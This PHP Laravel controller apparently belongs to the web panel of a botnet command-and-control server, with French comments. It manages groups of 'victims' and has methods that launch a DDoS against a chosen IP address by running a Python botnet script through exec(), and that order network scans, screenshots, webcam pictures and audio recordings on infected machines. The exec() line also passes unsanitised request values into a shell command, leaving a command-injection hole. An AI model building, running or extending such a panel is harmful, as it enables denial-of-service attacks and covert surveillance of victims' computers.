<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Network;
use App\Models\Victims;
use App\Models\VictimAttacks;
use App\Models\VictimGroup;
use App\Models\GroupAttacks;

class NetworkController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $username = auth()->user()->firstname;
        $name = auth()->user()->lastname;


        // Récupérer tous les groupes depuis la base de données
        $groups = Network::all();
        return view('network', ['username' => $username, 'name' => $name, 'groups' => $groups]);
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create(Request $request)
    {
        // Validation des données
        $request->validate([
            'name' => 'required',
            'image' => 'required|image|mimes:jpeg,png,jpg|max:2048',
        ]);

        // Traitement de l'image
        $imageName = time() . '.' . $request->image->extension();
        $request->image->move(public_path('images'), $imageName); 

        // Création de l'instance et enregistrement dans la base de données
        $network = new Network();
        $network->name = $request->name;
        $network->image = $imageName;
        $network->save();

        
        return redirect()->route('network')->with('success', 'Réseau créé avec succès.');
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     */
    public function show($id)
    {
        $username = auth()->user()->firstname;
        $name = auth()->user()->lastname;
    
        $group = Network::findOrFail($id);
    
        // Modification ici pour utiliser la table intermédiaire
        $victims = Victims::join('victim_groups', 'victims.id', '=', 'victim_groups.victim_id')
                            ->where('victim_groups.group_id', $id)
                            ->select('victims.*') // Sélectionner toutes les colonnes de la table victims
                            ->get();

        $scan = VictimAttacks::where('type', 'scan')
                            ->where('state', 'done')
                            ->latest('created_at')
                            ->first();

    
        return view('network.show', [
            'group' => $group, 
            'username' => $username, 
            'name' => $name, 
            'victims' => $victims,
            'scan' => $scan
        ]);
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        // Trouver le réseau par son ID
        $network = Network::findOrFail($id);

        // Supprimer l'image associée (si elle existe)
        if (file_exists(public_path('images/' . $network->image))) {
            unlink(public_path('images/' . $network->image));
        }

        //Supprimer toutes les victimes associées à ce réseau
        VictimGroup::where('group_id', $id)->delete();

        //Supprimer toutes les attaques associées à ce réseau	
        GroupAttacks::where('group_id', $id)->delete();
       
        // Supprimer le réseau de la base de données
        $network->delete();
       
        return redirect()->route('network')->with('success', 'Réseau supprimé avec succès.');
    }

    public function ddos(Request $request)
    {
        $group_id = $request->group_id;
        $group_name = $request->group_name;
        $ip_address = $request->ip_address;
        $duration = $request->duration;

        $command = "nohup bash -c 'source /home/debian/PA-BOTNET-PYSRV/venv/bin/activate && python3 /home/debian/PA-BOTNET-PYSRV/main.py --ddos --group $group_name --address $ip_address --time $duration > /dev/null 2>&1 &' > /dev/null 2>&1 & echo $!";
        exec($command, $output, $return);

        $pid = $output[0];

        return redirect("/network/$group_id")->with('output', "DDoS lancé sur l'adresse $ip_address pour $duration secondes.");
    }

    public function scan(Request $request)
    {
        $group_id = $request->group_id;
        $victim_uid = $request->victim_uid;

        $scan = (new BotnetController)->scan($victim_uid);

        return redirect("/network/$group_id");
    }

    public function screenshot(Request $request)
    {
        $group_id = $request->group_id;
        $victim_uid = $request->victim_uid;

        $screenshot = (new BotnetController)->screenshot($victim_uid);

        return redirect("/network/$group_id");
    }

    public function picture(Request $request)
    {
        $group_id = $request->group_id;
        $victim_uid = $request->victim_uid;

        $picture = (new BotnetController)->picture($victim_uid);

        return redirect("/network/$group_id");
    }

    public function record(Request $request)
    {
        $group_id = $request->group_id;
        $victim_uid = $request->victim_uid;

        $record = (new BotnetController)->record($victim_uid);

        return redirect("/network/$group_id");
    }

}
